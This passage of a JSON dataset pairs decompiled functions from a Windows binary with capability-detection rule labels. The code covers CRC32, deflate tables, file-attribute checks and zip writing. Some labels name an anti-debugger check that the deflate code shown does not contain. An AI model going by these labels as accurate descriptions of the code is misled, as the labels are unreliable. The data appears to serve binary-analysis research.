0;\n    var_9f8h = var_9f8h & 0xffffff00;\n    if (0xf < var_990h) {\n        fcn.0042d62b(var_9a4h);\n    }\n    var_990h = 0xf;\n    var_994h = 0;\n    var_9a4h = var_9a4h & 0xffffff00;\n    if (0xf < var_9c8h) {\n        fcn.0042d62b(var_9dch);\n    }\n    var_9c8h = 0xf;\n    var_9cch = 0;\n    var_9dch = var_9dch & 0xffffff00;\n    if (0xf < var_904h) {\n        fcn.0042d62b(var_918h);\n    }\n    var_904h = 0xf;\n    var_908h = 0;\n    var_918h = var_918h & 0xffffff00;\n    if (0xf < var_958h) {\n        fcn.0042d62b(var_96ch);\n    }\n    var_958h = 0xf;\n    var_95ch = 0;\n    var_96ch = var_96ch & 0xffffff00;\n    if (0xf < var_93ch) {\n        fcn.0042d62b(var_950h);\n    }\n    var_93ch = 0xf;\n    var_940h = 0;\n    var_950h = var_950h & 0xffffff00;\n    if (0xf < var_9ach) {\n        fcn.0042d62b(var_9c0h);\n    }\n    var_9ach = 0xf;\n    var_9b0h = 0;\n    var_9c0h = var_9c0h & 0xffffff00;\n    if (0xf < arg_20h) {\n        fcn.0042d62b(arg_ch);\n    }\n    arg_20h = 0xf;\n    arg_1ch = 0;\n    arg_ch = arg_ch & 0xffffff00;\n    if (0xf < arg_40h) {\n        fcn.0042d62b(arg_2ch);\n    }\ncode_r0x004121fc:\n    *in_FS_OFFSET = var_ch;\n    fcn.0042d636(uVar8);\n    return;\n}\n",
        "token_count": 5990
    },
    "004182b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004182b0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint var_34h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4415bb;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = 0;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        var_10h = fcn.0042ddfe(0x18);\n        var_4h = 0;\n        bVar3 = var_10h == 0;\n        if (bVar3) {\n            iVar2 = 0;\n        }\n        else {\n            arg_8h_00 = &var_34h;\n            fcn.00418010(arg_8h_00);\n            iVar2 = fcn.00418270(arg_8h_00, uVar1);\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = iVar2;\n        if (!bVar3) {\n            fcn.004180b0(&var_34h);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 365
    },
    "00421d60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421d60(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    code **ppcVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_34h;\n    code **var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44138b;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = NULL;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar1 = fcn.0042ddfe(8);\n        var_4h = 0;\n        var_10h = ppcVar1;\n        if (ppcVar1 == NULL) {\n            ppcVar1 = NULL;\n        }\n        else {\n            fcn.00418010(&var_34h);\n            ppcVar1[1] = NULL;\n            *ppcVar1 = vtable.std::codecvt_char__char__int_.0;\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = ppcVar1;\n        if (ppcVar1 != NULL) {\n            fcn.004180b0(&var_34h);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 324
    },
    "00425140": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00425140(code **param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    *param_1 = vtable.std::basic_stringbuf_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    if ((*(param_1 + 0x10) & 1) != 0) {\n        fcn.0042d62b(*param_1[4]);\n    }\n    *param_1[4] = 0;\n    *param_1[8] = 0;\n    *param_1[0xc] = 0;\n    *param_1[5] = 0;\n    *param_1[9] = 0;\n    *param_1[0xd] = 0;\n    param_1[0x10] = param_1[0x10] & 0xfffffffe;\n    param_1[0xf] = NULL;\n    puVar1 = param_1[0xe];\n    *param_1 = vtable.std::basic_streambuf_char__struct_std::char_traits_char__.0;\n    if (puVar1 != NULL) {\n        uVar2 = *puVar1;\n        if (uVar2 != 0) {\n            fcn.0042d14d(0);\n            iVar3 = *(uVar2 + 4);\n            if ((iVar3 != 0) && (iVar3 != -1)) {\n                *(uVar2 + 4) = iVar3 + -1;\n            }\n            iVar3 = *(uVar2 + 4);\n            fcn.0042d175();\n            puVar4 = ~-(iVar3 != 0) & uVar2;\n            if (puVar4 != NULL) {\n                (***puVar4)(1);\n            }\n        }\n        fcn.0042d62b(puVar1);\n    }\n    fcn.0042d1a6();\n    return;\n}\n",
        "token_count": 448
    },
    "00427640": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427640(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    code **ppcVar2;\n    int32_t *in_FS_OFFSET;\n    ulong uVar3;\n    uint *arg_8h_00;\n    uint var_34h;\n    code **var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x44138b;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = NULL;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar2 = fcn.0042ddfe(0x10);\n        var_4h = 0;\n        var_10h = ppcVar2;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = &var_34h;\n            fcn.00418010(arg_8h_00);\n            ppcVar2[1] = NULL;\n            *ppcVar2 = vtable.std::num_put_char__class_std::ostreambuf_iterator_char__struct_std::char_traits_char___.0;\n            uVar3 = fcn.0042d520(arg_8h_00, uVar1);\n            ppcVar2[2] = uVar3;\n            ppcVar2[3] = uVar3 >> 0x20;\n        }\n        var_4h = 0xffffffff;\n        *arg_8h = ppcVar2;\n        if (ppcVar2 != NULL) {\n            fcn.004180b0(&var_34h);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 4;\n}\n",
        "token_count": 447
    },
    "00427700": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00427700(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    code **ppcVar2;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint var_38h;\n    code **var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4412ed;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = 0;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar2 = fcn.0042ddfe(0x18);\n        var_4h = 0;\n        var_14h = ppcVar2;\n        if (ppcVar2 == NULL) {\n            ppcVar2 = NULL;\n        }\n        else {\n            arg_8h_00 = &var_38h;\n            fcn.00418010(arg_8h_00);\n            var_10h = 1;\n            ppcVar2[1] = NULL;\n            var_4h = 2;\n            *ppcVar2 = vtable.std::numpunct_char_.0;\n            fcn.004277c0(ppcVar2, arg_8h_00, uVar1);\n        }\n        *arg_8h = ppcVar2;\n        var_4h = 0xffffffff;\n        if (ppcVar2 != NULL) {\n            fcn.004180b0(&var_38h);\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return 4;\n}\n",
        "token_count": 422
    },
    "004289d0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.004289d0(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    ushort *puVar4;\n    uint32_t uVar5;\n    uint16_t *puVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    int32_t unaff_ESI;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    *(unaff_ESI + 0x1af50) = in_EAX;\n    *(unaff_ESI + 0x1af48) = 0;\n    *(unaff_ESI + 0x1af44) = 0;\n    *(unaff_ESI + 0x1af4c) = 0;\n    if (*(unaff_ESI + 0xe7e) == 0) {\n        var_8h = unaff_ESI + 0x1e40;\n        iVar3 = 0;\n        cVar1 = '\\0';\n        puVar8 = 0x44c920;\n        do {\n            iVar10 = 0;\n            *var_8h = iVar3;\n            if (0 < 1 << (*puVar8 & 0x1f)) {\n                do {\n                    *(unaff_ESI + 0x1b3d + iVar3) = cVar1;\n                    iVar10 = iVar10 + 1;\n                    iVar3 = iVar3 + 1;\n                } while (iVar10 < 1 << (*puVar8 & 0x1f));\n            }\n            var_8h = var_8h + 1;\n            cVar1 = cVar1 + '\\x01';\n            puVar8 = puVar8 + 1;\n        } while (puVar8 < 0x44c990);\n        *(iVar3 + 0x1b3c + unaff_ESI) = cVar1;\n        var_4h = unaff_ESI + 0x1eb4;\n        iVar3 = 0;\n        iVar10 = 0;\n        puVar8 = 0x44c9a8;\n        do {\n            *var_4h = iVar3;\n            var_8h = NULL;\n            if (0 < 1 << (*puVar8 & 0x1f)) {\n                do {\n                    var_8h = var_8h + 1;\n                    *(unaff_ESI + 0x1c3d + iVar3) = iVar10;\n                    iVar3 = iVar3 + 1;\n                } while (var_8h < 1 << (*puVar8 & 0x1f));\n            }\n            var_4h = var_4h + 1;\n            puVar8 = puVar8 + 1;\n            iVar10 = iVar10 + 1;\n        } while (puVar8 < 0x44c9e8);\n        iVar3 = iVar3 >> 7;\n        if (iVar10 < 0x1e) {\n            puVar8 = iVar10 * 4 + 0x44c9a8;\n            var_8h = unaff_ESI + 0x1eb4 + iVar10 * 4;\n            do {\n                *var_8h = iVar3 << 7;\n                iVar11 = 0;\n                if (0 < 1 << (*puVar8 - 7U & 0x1f)) {\n                    do {\n                        *(unaff_ESI + 0x1d3d + iVar3) = iVar10;\n                        iVar11 = iVar11 + 1;\n                        iVar3 = iVar3 + 1;\n                    } while (iVar11 < 1 << (*puVar8 - 7U & 0x1f));\n                }\n                var_8h = var_8h + 1;\n                puVar8 = puVar8 + 1;\n                iVar10 = iVar10 + 1;\n            } while (puVar8 < 0x44ca20);\n        }\n        *(unaff_ESI + 0xfe4) = 0;\n        *(unaff_ESI + 0xfe8) = 0;\n        *(unaff_ESI + 0xfec) = 0;\n        *(unaff_ESI + 0xff0) = 0;\n        *(unaff_ESI + 0xff4) = 0;\n        *(unaff_ESI + 0xff8) = 0;\n        *(unaff_ESI + 0xffc) = 0;\n        *(unaff_ESI + 0x1000) = 0;\n        puVar4 = unaff_ESI + 0xa02;\n        iVar3 = 0x18;\n        do {\n            puVar4[-2] = 8;\n            *(unaff_ESI + 0xff4) = *(unaff_ESI + 0xff4) + 1;\n            *puVar4 = 8;\n            *(unaff_ESI + 0xff4) = *(unaff_ESI + 0xff4) + 1;\n            puVar4[2] = 8;\n            *(unaff_ESI + 0xff4) = *(unaff_ESI + 0xff4) + 1;\n            puVar4[4] = 8;\n            *(unaff_ESI + 0xff4) = *(unaff_ESI + 0xff4) + 1;\n            puVar4[6] = 8;\n            *(unaff_ESI + 0xff4) = *(unaff_ESI + 0xff4) + 1;\n            puVar4[8] = 8;\n            *(unaff_ESI + 0xff4) = *(unaff_ESI + 0xff4) + 1;\n            puVar4 = puVar4 + 0xc;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = unaff_ESI + 0xc3e;\n        iVar3 = 0x70;\n        do {\n            *puVar4 = 9;\n            *(unaff_ESI + 0xff6) = *(unaff_ESI + 0xff6) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        iVar3 = 0x18;\n        puVar4 = unaff_ESI + 0xdfe;\n        do {\n            *puVar4 = 7;\n            *(unaff_ESI + 0xff2) = *(unaff_ESI + 0xff2) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        puVar4 = unaff_ESI + 0xe5e;\n        iVar3 = 8;\n        do {\n            *puVar4 = 8;\n            *(unaff_ESI + 0xff4) = *(unaff_ESI + 0xff4) + 1;\n            puVar4 = puVar4 + 2;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        fcn.00429050(0x11f);\n        puVar6 = unaff_ESI + 0xe7c;\n        uVar12 = 0;\n        do {\n            puVar6[1] = 5;\n            iVar3 = 5;\n            uVar2 = 0;\n            uVar7 = uVar12;\n            do {\n                uVar5 = uVar2;\n                uVar9 = uVar7 & 1;\n                iVar3 = iVar3 + -1;\n                uVar7 = uVar7 >> 1;\n                uVar2 = (uVar5 | uVar9) * 2;\n            } while (0 < iVar3);\n            *puVar6 = uVar5 | uVar9;\n            uVar12 = uVar12 + 1;\n            puVar6 = puVar6 + 2;\n        } while (uVar12 < 0x1e);\n        fcn.00428cd0();\n    }\n    return;\n}\n",
        "token_count": 1839
    },
    "00429050": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid __cdecl fcn.00429050(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int16_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t in_EDX;\n    int16_t *piVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t unaff_EDI;\n    uint var_24h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    iVar3 = 0;\n    iVar6 = 1;\n    piVar7 = in_EDX + 0xfe4;\n    do {\n        iVar3 = (*piVar7 + iVar3) * 2;\n        *(&var_24h + iVar6 * 2) = iVar3;\n        iVar6 = iVar6 + 1;\n        piVar7 = piVar7 + 1;\n    } while (iVar6 < 0x10);\n    iVar6 = 0;\n    if (-1 < arg_8h) {\n        do {\n            uVar8 = *(unaff_EDI + 2 + iVar6 * 4);\n            if (uVar8 != 0) {\n                uVar1 = *(&var_24h + uVar8 * 2);\n                uVar4 = uVar1;\n                *(&var_24h + uVar8 * 2) = uVar1 + 1;\n                uVar2 = 0;\n                do {\n                    uVar5 = uVar2;\n                    uVar9 = uVar4 & 1;\n                    uVar8 = uVar8 - 1;\n                    uVar4 = uVar4 >> 1;\n                    uVar2 = (uVar5 | uVar9) * 2;\n                } while (0 < uVar8);\n                *(unaff_EDI + iVar6 * 4) = uVar5 | uVar9;\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 <= arg_8h);\n    }\n    fcn.0042d636(var_24h);\n    return;\n}\n",
        "token_count": 509
    },
    "004299c0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004299c0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t arg_8h_00;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_10h;\n    uint16_t *var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar3 = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0;\n    if (*(in_EAX + 0x1af2c) != 0) {\n        var_ch = in_EAX + 0x9f2c;\n        do {\n            if ((uVar3 & 7) == 0) {\n                var_1h._0_1_ = *(var_8h + 0x19f2c + in_EAX);\n                var_8h = var_8h + 1;\n            }\n            uVar4 = *(in_EAX + 0x1f2c + uVar3);\n            uVar3 = uVar3 + 1;\n            if ((var_1h & 1) == 0) {\n                uVar4 = *(arg_8h + 2 + uVar4 * 4);\ncode_r0x00429ac0:\n                fcn.00429bb0(uVar4);\n            }\n            else {\n                uVar4 = *(uVar4 + 0x1b3d + in_EAX);\n                fcn.00429bb0(*(arg_8h + 0x406 + uVar4 * 4));\n                arg_8h_00 = *(uVar4 * 4 + 0x44c920);\n                if (arg_8h_00 != 0) {\n                    fcn.00429bb0(arg_8h_00);\n                }\n                uVar1 = *var_ch;\n                var_ch = var_ch + 1;\n                if (uVar1 < 0x100) {\n                    uVar2 = *(uVar1 + 0x1c3d + in_EAX);\n                }\n                else {\n                    uVar2 = *((uVar1 >> 7) + 0x1d3d + in_EAX);\n                }\n                fcn.00429bb0(*(arg_ch + 2 + uVar2 * 4));\n                uVar4 = *(uVar2 * 4 + 0x44c9a8);\n                if (uVar4 != 0) goto code_r0x00429ac0;\n            }\n            var_1h._0_1_ = var_1h >> 1;\n        } while (uVar3 < *(in_EAX + 0x1af2c));\n    }\n    fcn.00429bb0(*(arg_8h + 0x402));\n    return;\n}\n",
        "token_count": 682
    },
    "0042b360": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042b360(uint arg_8h, uint32_t *arg_ch, uint *arg_10h)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t *in_ECX;\n    uint32_t *in_EDX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint unaff_ESI;\n    ulong uVar5;\n    uint *arg_8h_00;\n    uint var_70h;\n    int32_t var_6ch;\n    uint32_t *var_68h;\n    int32_t var_64h;\n    uint32_t var_60h;\n    uint32_t *var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    int32_t var_44h;\n    uint32_t var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    uint32_t *var_34h;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    var_68h = arg_ch;\n    arg_8h_00 = &var_4ch;\n    var_5ch = in_EDX;\n    iVar2 = (**0x4574b0)(arg_8h);\n    if (iVar2 == 0) {\n        fcn.0042d636(unaff_ESI);\n        return;\n    }\n    uVar3 = (var_4ch & 1) != 0;\n    if ((var_4ch & 2) != 0) {\n        uVar3 = uVar3 | 2;\n    }\n    if ((var_4ch & 4) != 0) {\n        uVar3 = uVar3 | 4;\n    }\n    if ((var_4ch & 0x10) != 0) {\n        uVar3 = uVar3 | 0x10;\n    }\n    if ((var_4ch & 0x20) != 0) {\n        uVar3 = uVar3 | 0x20;\n    }\n    if ((var_4ch & 0x10) == 0) {\n        uVar3 = uVar3 | 0x80000000;\n    }\n    else {\n        uVar3 = uVar3 | 0x40000000;\n    }\n    uVar4 = uVar3 | 0x1000000;\n    if ((var_4ch & 1) == 0) {\n        uVar4 = uVar3 | 0x1800000;\n    }\n    var_54h = (**0x457590)(arg_8h, 0);\n    if (0x28 < var_54h) {\n        (**0x4573d0)(arg_8h, 0, 0, 0);\n        (**0x4574dc)(arg_8h, &var_50h, 2, &var_58h, 0);\n        (**0x4573d0)(arg_8h, 0x24, 0, 0);\n        (**0x4574dc)(arg_8h, &var_6ch, 4, &var_58h, 0);\n        if ((var_50h == 0x54ad) && (var_6ch + 0x34U < var_54h)) {\n            (**0x4573d0)(arg_8h, var_6ch, 0, 0);\n            (**0x4574dc)(arg_8h, &var_64h, 4, &var_58h, 0);\n            if ((var_64h == 0x5a4d) || (((var_64h == 0x454e || (var_64h == 0x454c)) || (var_64h == 0x4550)))) {\n                uVar4 = uVar4 | 0x400000;\n            }\n        }\n    }\n    if (var_68h != NULL) {\n        *var_68h = uVar4;\n    }\n    if (in_ECX != NULL) {\n        *in_ECX = var_54h;\n    }\n    if (arg_10h != NULL) {\n        uVar5 = fcn.00436c90(var_40h + 0x2ac18000, (var_3ch + -0x19db1de) - (var_40h < 0xd53e8000), 10000000, 0);\n        arg_10h[1] = uVar5 >> 0x20;\n        *arg_10h = uVar5;\n        uVar5 = fcn.00436c90(var_38h + 0x2ac18000, var_34h + (-0x19db1de - (var_38h < 0xd53e8000)), 10000000, 0);\n        arg_10h[2] = uVar5;\n        arg_10h[3] = uVar5 >> 0x20;\n        uVar5 = fcn.00436c90(var_48h + 0x2ac18000, (var_44h + -0x19db1de) - (var_48h < 0xd53e8000), 10000000, 0);\n        arg_10h[4] = uVar5;\n        arg_10h[5] = uVar5 >> 0x20;\n    }\n    puVar1 = var_5ch;\n    if (var_5ch != NULL) {\n        var_60h = var_38h;\n        var_5ch = var_34h;\n        (**0x4575b4)(&var_60h, &var_18h);\n        *puVar1 = (((CONCAT22(var_18h._2_2_, var_18h) + -0x3c) * 0x10 & 0x7ffU | var_18h._2_2_ & 0xf) << 5 |\n                  var_12h & 0x1f) << 0x10 | (var_eh & 0x3f | (var_12h._2_2_ & 0x1f) << 6) << 5 | var_eh._2_2_ * 2 & 0x1f\n        ;\n    }\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 1499
    },
    "0042bf30": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4b8h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042bf30(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    char **ppcVar1;\n    uint8_t uVar2;\n    bool bVar3;\n    int16_t iVar4;\n    char cVar5;\n    uchar uVar6;\n    uint *puVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint arg_8h_00;\n    uint *puVar12;\n    char **in_ECX;\n    char *pcVar13;\n    char *pcVar14;\n    char *pcVar15;\n    uint unaff_ESI;\n    char *pcVar16;\n    uint *puVar17;\n    bool bVar18;\n    uint var_4b8h;\n    int32_t var_4b4h;\n    uint var_4b0h;\n    int32_t var_4ach;\n    char *var_4a8h;\n    uint var_4a1h;\n    uint var_49ch;\n    uint var_498h;\n    char *var_494h;\n    char *var_490h;\n    char *var_48ch;\n    char *var_488h;\n    int32_t var_484h;\n    int32_t var_480h;\n    uint var_47ch;\n    uint var_478h;\n    ushort var_474h;\n    uint var_472h;\n    char *var_46ch;\n    char *var_468h;\n    uint var_464h;\n    uint *var_360h;\n    uint *var_35ch;\n    uint var_358h;\n    uint var_354h;\n    uint var_250h;\n    uint var_14ch;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar var_1dh;\n    uint var_1ch;\n    uchar var_18h;\n    uint var_17h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    uchar var_10h;\n    uchar var_fh;\n    uchar var_eh;\n    uchar var_dh;\n    uchar var_ch;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    if (in_ECX[5] != NULL) {\n        fcn.0042d636(in_ECX);\n        return;\n    }\n    if (*(in_ECX + 0xb) != '\\0') {\n        fcn.0042d636(in_ECX);\n        return;\n    }\n    var_4b4h = 0;\n    if ((*in_ECX != NULL) && (arg_10h != 4)) {\n        var_4b4h = 0xc;\n    }\n    (**0x4575cc)(&var_13ch, arg_8h);\n    if (var_13ch == '\\0') goto code_r0x0042c830;\n    puVar7 = &var_13ch;\n    do {\n        if (*puVar7 == '\\\\') {\n            *puVar7 = '/';\n        }\n        puVar7 = puVar7 + 1;\n    } while (*puVar7 != '\\0');\n    bVar18 = arg_10h == 4;\n    if (bVar18) {\n        puVar7 = &var_13ch;\n        do {\n            puVar17 = puVar7;\n            puVar7 = puVar17 + 1;\n        } while (*puVar17 != '\\0');\n        bVar3 = true;\n        if (*(puVar17 + -1) == '/') goto code_r0x0042c012;\n    }\n    else {\ncode_r0x0042c012:\n        bVar3 = false;\n    }\n    iVar4 = 8;\n    if ((bVar18) || (cVar5 = fcn.0042b240(),  cVar5 != '\\0')) {\n        iVar4 = 0;\n    }\n    if (arg_10h == 2) {\n        iVar8 = fcn.0042b880();\n    }\n    else if (arg_10h == 1) {\n        iVar8 = fcn.0042b900(arg_ch);\n    }\n    else if (arg_10h == 3) {\n        iVar8 = fcn.0042ba60(arg_ch);\n    }\n    else {\n        if (arg_10h != 4) goto code_r0x0042c830;\n        iVar8 = fcn.0042bb90();\n    }\n    if (iVar8 != 0) goto code_r0x0042c830;\n    var_140h = 0;\n    (**0x4575cc)(&var_464h, 0x44c726);\n    (**0x4575cc)(&var_354h, &var_13ch);\n    var_484h = (**0x457418)(&var_354h);\n    if (bVar3) {\n        (**0x457520)(&var_354h, 0x44ed28);\n        var_484h = var_484h + 1;\n    }\n    (**0x4575cc)(&var_250h, 0x44c726);\n    var_472h._0_2_ = 0;\n    var_494h = in_ECX[0x1a];\n    var_472h._2_2_ = 8;\n    var_358h = 0;\n    var_478h = 0;\n    var_14ch = 1;\n    var_144h = 0;\n    var_49ch = 0x140b17;\n    var_490h = NULL;\n    var_498h._0_2_ = 8;\n    if ((*in_ECX != NULL) && (!bVar18)) {\n        var_472h._2_2_ = 9;\n        var_498h._0_2_ = 9;\n    }\n    if ((iVar4 == 0) && (-1 < in_ECX[0x1c])) {\n        var_48ch = in_ECX[0x1c] + var_4b4h;\n    }\n    else {\n        var_48ch = NULL;\n    }\n    var_488h = in_ECX[0x1c];\n    var_46ch = in_ECX[0x13];\n    pcVar14 = in_ECX[0x16];\n    var_468h = in_ECX[6] + in_ECX[4];\n    var_474h = 0;\n    var_360h = &var_1ch;\n    var_35ch = &var_34h;\n    var_13h = *(in_ECX + 0x14);\n    pcVar15 = in_ECX[0x14];\n    var_2ch._0_1_ = pcVar14 >> 0x18;\n    var_12h = pcVar15 >> 8;\n    var_11h = pcVar15 >> 0x10;\n    pcVar13 = in_ECX[0x18];\n    var_10h = pcVar15 >> 0x18;\n    var_fh = *(in_ECX + 0x18);\n    var_eh = pcVar13 >> 8;\n    var_dh = pcVar13 >> 0x10;\n    var_ch = pcVar13 >> 0x18;\n    var_1ch = 0xd5455;\n    _var_18h = CONCAT31(CONCAT12(pcVar14 >> 0x10, CONCAT11(pcVar14 >> 8, *(in_ECX + 0x16))), 7);\n    var_480h = 0x11;\n    var_47ch = 9;\n    var_30h = _var_18h;\n    var_34h = 0x55455;\n    var_498h._2_2_ = iVar4;\n    var_17h._3_1_ = var_2ch;\n    iVar8 = fcn.0042a760();\n    if (iVar8 != 0) {\n        fcn.0042bd50();\n        goto code_r0x0042c2ba;\n    }\n    in_ECX[6] = in_ECX[6] + var_480h + 0x1e + var_484h;\n    if (in_ECX[5] != NULL) {\n        fcn.0042bd50();\n        fcn.0042d636(unaff_ESI);\n        return;\n    }\n    ppcVar1 = in_ECX + 0xc;\n    in_ECX[0xd] = 0x23456789;\n    in_ECX[0xe] = 0x34567890;\n    pcVar14 = *in_ECX;\n    *ppcVar1 = 0x12345678;\n    for (; (pcVar14 != NULL && (*pcVar14 != '\\0')); pcVar14 = pcVar14 + 1) {\n        fcn.0042b1f0();\n    }\n    if (*0x4576e9 == '\\0') {\n        uVar9 = (**0x457378)();\n        uVar10 = (**0x45758c)();\n        fcn.0042f3d4(uVar9 ^ uVar10);\n    }\n    iVar8 = 0;\n    do {\n        iVar11 = fcn.0042f3e6();\n        *(&var_28h + iVar8) = iVar11 >> 7;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xc);\n    var_4a8h = in_ECX[0xd];\n    pcVar14 = *ppcVar1;\n    var_1dh = var_494h >> 8;\n    pcVar15 = in_ECX[0xe];\n    var_4ach = 0;\n    do {\n        pcVar13 = *(((*(&var_28h + var_4ach) ^ pcVar14) & 0xff) * 4 + 0x44cac0) ^ pcVar14 >> 8;\n        uVar9 = pcVar15 & 0xfffd | 2;\n        pcVar16 = (var_4a8h + (pcVar13 & 0xff)) * 0x8088405 + 1;\n        *ppcVar1 = pcVar13;\n        in_ECX[0xd] = pcVar16;\n        pcVar14 = pcVar15 >> 8 ^ *(((pcVar16 >> 0x18 ^ pcVar15) & 0xff) * 4 + 0x44cac0);\n        uVar2 = *(&var_28h + var_4ach);\n        in_ECX[0xe] = pcVar14;\n        *(&var_28h + var_4ach) = (uVar9 ^ 1) * uVar9 >> 8 ^ uVar2;\n        uVar2 = *(&var_28h + var_4ach + 1);\n        